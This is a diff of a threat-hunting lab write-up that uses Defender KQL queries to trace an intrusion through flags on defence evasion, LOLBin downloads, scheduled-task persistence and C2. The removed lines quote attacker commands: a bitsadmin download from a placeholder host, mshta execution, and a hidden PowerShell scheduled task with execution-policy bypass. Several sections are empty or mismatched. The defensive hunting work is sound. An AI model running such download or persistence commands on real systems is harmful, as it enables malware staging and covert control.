@@ -170,6 +170,7 @@ Search for newly created directories in system folders that were subsequently hi
 
 **PRIMARY Staging Directory Found:**
 C:\ProgramData\WindowsCache
+Nov 20, 2025 2:05:30 AM
 
 **Why It Matters:**
 
@@ -186,181 +187,149 @@ DeviceFileEvents
 
 
 
-### ⚙️ Flag 5 – LOLBin Usage: bitsadmin
+### ⚙️ Flag 5 – DEFENCE EVASION - File Extension Exclusions
 
 **Objective:**
-Identify a stealthy download executed using native Windows utilities.
+Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.
 
 **What to Hunt:**
-Look for executions of bitsadmin.exe with URLs and local paths — common signs of file transfer abuse.
+Search DeviceRegistryEvents for registry modifications to Windows Defender's exclusion settings. Look for the RegistryValueName field containing file extension. Count the unique file extensions added to the "Exclusions\Extensions" registry key during the attack timeline.
 
-**Identified Command:**
-"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe
-
-**Why It Matters:**
-bitsadmin.exe is a living-off-the-land binary (LOLBin) often abused by attackers to download payloads while bypassing traditional security tools. In this case, a file named crypto_toolkit.exe was silently fetched and stored as market_sync.exe in the user’s Temp directory — an early-stage staging indicator.
-
-**KQL Query Used:**
-```
-DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where ProcessCommandLine contains "bitsadmin.exe"
-| project Timestamp, DeviceName,FileName , ProcessCommandLine, InitiatingProcessFileName
-| sort by Timestamp asc
-```
-<img width="1593" height="146" alt="8c64117d-905c-45e7-a06d-870483997136" src="https://github.com/user-attachments/assets/90c04309-ae3c-4937-a477-50bd1f00f80f" />
-
-
-### 💾 Flag 6 – Suspicious Payload Deployment
-
-**Objective:**
-Identify executable payloads dropped in nonstandard or staging directories.
-
-**What to Hunt:**
-Look for .exe files created in folders like Temp, AppData, or Downloads — especially those with deceptive or business-related names.
-
-**Identified Payload:**
-
-- File Name: ledger_viewer.exe
-
-- Folder Path: C:\Users\Mich34L_id\AppData\Local\Temp\ledger_viewer.exe
-
-- Device: michaelvm
+**Identified File Extension Excluded:**
+3
+powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command "& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14144035.0.14144035-462fc402c4ea5c03148fd915012f3d7aee74f9d4\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14144035.0.14144035-462fc402c4ea5c03148fd915012f3d7aee74f9d4\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '25fda4c27044455e664e8c26cdd2911117493a9122c002cd9462a9ce9c677f22')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14144035.0.14144035-462fc402c4ea5c03148fd915012f3d7aee74f9d4\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' }"
 
 **Why It Matters:**
-The executable ledger_viewer.exe appears financial in nature but was deployed into the user’s Temp directory, a common location used for staging malware. The naming suggests an attempt to blend in as a legitimate utility, aligning with pre-execution payload setup.
+
 
 **KQL Query Used:**
 ```
 DeviceFileEvents
-| where DeviceName == "michaelvm"
-| where FileName contains "ledger"
-| where FileName contains "exe"
-| project Timestamp, DeviceName, ActionType, FileName, FolderPath
+| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
+| where DeviceName == "azuki-sl"
+| where InitiatingProcessParentFileName contains "sense"
 ```
+<img width="1668" height="249" alt="image" src="https://github.com/user-attachments/assets/e4227628-f81c-4c71-8509-d8867114398e" />
+<img width="1678" height="435" alt="image" src="https://github.com/user-attachments/assets/d86c2602-327d-4996-a572-65bb1b582930" />
 
-<img width="1177" height="90" alt="df258a37-6bd0-40a1-8d68-17c518e7f47a" src="https://github.com/user-attachments/assets/9e786a76-ae6e-4b73-b779-2b85d688c6c0" />
 
 
-### 📎 Flag 7 – HTA Abuse via LOLBin
+### 💾 Flag 6: DEFENCE EVASION - Temporary Folder Exclusion
 
 **Objective:**
-Detect the execution of HTML Application (.hta) files using trusted Windows tools.
+Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.
 
 **What to Hunt:**
-Look for execution of mshta.exe pointing to local .hta scripts, particularly those in Temp or AppData directories.
+Search DeviceRegistryEvents for folder path exclusions added to Windows Defender configuration. Focus on the RegistryValueName field. Look for temporary folder paths added to the exclusions list during the attack timeline. Copy the path exactly as it appears in the RegistryValueName field. The registry key contains "Exclusions\Paths" under Windows Defender configuration.
 
-**Identified Command**
-"mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta
+**Identified Temporary Folder:**
 
-**Why It Matters:**
-HTA files can embed VBScript or JavaScript and are executed by mshta.exe, a native Windows binary. This method is frequently used in social engineering attacks to bypass traditional script execution restrictions. In this case, the attacker leveraged a file named client_update.hta located in a Temp folder — a strong signal of malicious intent.
-
-KQL Query Used:
-```
-DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where ProcessCommandLine contains "mshta.exe"
-| project Timestamp, DeviceName, ProcessCommandLine
-```
-
-<img width="894" height="137" alt="fdcd5a52-b6e2-47c3-81b5-35e8ffa1054c" src="https://github.com/user-attachments/assets/69183010-6fa7-4e38-b64d-3829538e7775" />
-
-
-
-### 🗂️ Flag 8 – ADS Execution Attempt
-
-**Objective:**
-Track whether attackers used Alternate Data Streams (ADS) to hide or execute malicious payloads.
-
-**What to Hunt:**
-Look for .dll files appearing in suspicious paths (e.g., Temp folders), especially with filenames that resemble legitimate content (like reports or documents). These are often attached to other files or launched via trusted processes.
-
-**Identified Artifact:**
-
-- File Name: investor_report.dll
-
-- Folder Path: C:\Users\Mich34L_id\AppData\Local\Temp\investor_report.dll
-
-- Initiating Process: powershell.exe
-
-- SHA1 Hash: 801262e122db6a2e758962896f260b55bbd0136a
-
-- Timestamp: 2025-06-16T06:32:09.4710257Z
+C:\Users\KENJI~1.SAT\AppData\Local\Temp
 
 **Why It Matters:**
-The DLL’s name — investor_report.dll — closely mimics a legitimate document title, likely as a disguise. Coupled with its placement in a Temp directory and launch via PowerShell, this strongly suggests it may have been used in an ADS-based or stealth execution technique. ADS attacks are commonly used to hide execution trails by appending malicious DLLs to innocuous file containers (e.g., document.docx:hidden.dll).
-
-**KQL Query Used:**
-```
-DeviceFileEvents
-| where Timestamp > datetime("2025-06-16T06:15:37.4710257Z")
-| where DeviceName == "michaelvm"
-| where FileName contains "dll"
-| where FolderPath has @"C:\Users\Mich34L_id\AppData\Local\Temp"
-| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessSHA1
-```
-<img width="612" height="261" alt="05cf2159-9c1c-4802-946f-d37a78ac5ab5" src="https://github.com/user-attachments/assets/b694fa48-e98e-49f7-97c8-15bea1fb55cf" />
-
-
-### 🗝️ Flag 9 – Registry Persistence Confirmation
-
-**Objective:**
-Confirm that the attacker established persistence by writing to a registry autorun key.
-
-**What to Hunt:**
-Look for modification of autorun keys under HKCU\...\CurrentVersion\Run — a common persistence technique that triggers script or binary execution at user logon.
-
-**Identified Registry Entry:**
-
-- Key Path:
-HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-
-- Value Name: WalletUpdater
-
-- Action Type: RegistryValueSet
-
-- Initiating Process: powershell.exe
-
-- Timestamp: 2025-06-16T06:41:24.1068836Z
-
-- Device: michaelvm
-
-**Why It Matters:**
-Persistence via registry is a low-friction, high-reliability method that survives reboots and evades detection if disguised. The name WalletUpdater mimics legitimate crypto-related software, indicating social engineering or camouflage intent. This persistence path ensures the attack script or loader runs on each user session start.
 
 **KQL Query Used:**
 ```
 DeviceRegistryEvents
-| where DeviceName == "michaelvm"
-| where RegistryKey has @"Currentversion\run"
-| project Timestamp, DeviceName, ActionType, RegistryKey, PreviousRegistryKey, RegistryValueName, PreviousRegistryValueName, InitiatingProcessCommandLine
+| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
+| where DeviceName == "azuki-sl"
+
 ```
 
-<img width="1068" height="234" alt="24aabf33-c115-4f50-8776-75412ceb6a27" src="https://github.com/user-attachments/assets/12237500-7e73-4d93-b88d-513fd7ee17d8" />
+<img width="1677" height="402" alt="image" src="https://github.com/user-attachments/assets/d19ed60a-9ddb-45e7-84b9-1641deef37f7" />
 
 
-### ⏰ Flag 10 – Scheduled Task Execution
+
+### 📎 Flag 7 – DEFENCE EVASION - Download Utility Abuse
 
 **Objective:**
-Validate the scheduled task that launches the attacker’s payload.
+Legitimate system utilities are often weaponized to download malware while evading detection. Identifying these techniques helps improve defensive controls.
 
 **What to Hunt:**
-Track the creation of scheduled tasks (schtasks.exe) with suspicious names or pointing to staging directories (e.g., Temp).
+Look for built-in Windows tools with network download capabilities being used during the attack. Search DeviceProcessEvents for processes with command lines containing URLs and output file paths.
+
+**Identified Command**
+certutil.exe
+Nov 20, 2025 2:06:58 AM
+**Why It Matters:**
+
+
+KQL Query Used:
+```
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
+| where ProcessCommandLine contains "//"
+| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
+```
+
+<img width="555" height="529" alt="image" src="https://github.com/user-attachments/assets/e2690950-e773-44b1-b292-40d35f1b3920" />
+
+
+
+
+### 🗂️ Flag 8 – Scheduled Task Name
+
+**Objective:**
+Scheduled tasks provide reliable persistence across system reboots. The task name often attempts to blend with legitimate Windows maintenance routines.
+
+**What to Hunt:**
+Search for scheduled task creation commands executed during the attack timeline. Look for schtasks.exe with the /create parameter in DeviceProcessEvents.
+
+**Identified Scheduled Task:**
+Windows Update Check
+Nov 20, 2025 2:07:46 AM
+**Why It Matters:**
+
+**KQL Query Used:**
+```
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
+| where ProcessCommandLine contains "schtasks"
+| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
+```
+<img width="545" height="425" alt="image" src="https://github.com/user-attachments/assets/6d53958a-2f9e-4841-bb1d-8ee5676b99c7" />
+
+
+
+### 🗝️ Flag 9 – PERSISTENCE - Scheduled Task Target
+
+**Objective:**
+The scheduled task action defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.
+
+**What to Hunt:**
+Extract the task action from the scheduled task creation command line. Look for the /tr parameter value in the schtasks command.
+
+**Identified Executable Path within Scheduled Task:**
+C:\ProgramData\WindowsCache\svchost.exe
+
+**Why It Matters:**
+
+
+**KQL Query Used:**
+```
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
+| where ProcessCommandLine contains "schtasks"
+| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
+```
+
+<img width="839" height="69" alt="image" src="https://github.com/user-attachments/assets/b8e1a986-c3c3-4d61-b6e4-f59b5ab802b3" />
+
+
+
+### ⏰ Flag 10 – COMMAND & CONTROL - C2 Server Address
+
+**Objective:**
+Command and control infrastructure allows attackers to remotely control compromised systems. Identifying C2 servers enables network blocking and infrastructure tracking.
+
+**What to Hunt:**
+Analyse network connections initiated by the suspicious executable shortly after it was downloaded. Use DeviceNetworkEvents to find outbound connections from the malicious process to external IP addresses.
 
 **Identified Scheduled Task:**
 
-- Task Name: MarketHarvestJob
-
-- Command Line: schtasks /Create /SC ONLOGON /TN "MarketHarvestJob" /TR powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta" /RL HIGHEST /F
-
-- Folder Path: C:\Windows\System32\schtasks.exe
-
-- Initiating Process: cmd.exe launched by powershell.exe
-
-- Device: michaelvm
-
-- Timestamp: 2025-06-15T19:52:39
 
 **Why It Matters:**
 The attacker created a scheduled task named MarketHarvestJob to persistently execute a malicious HTA file using powershell.exe. This task triggers on user logon, ensuring the payload re-executes even after reboots — a common persistence mechanism seen in fileless malware deployments.
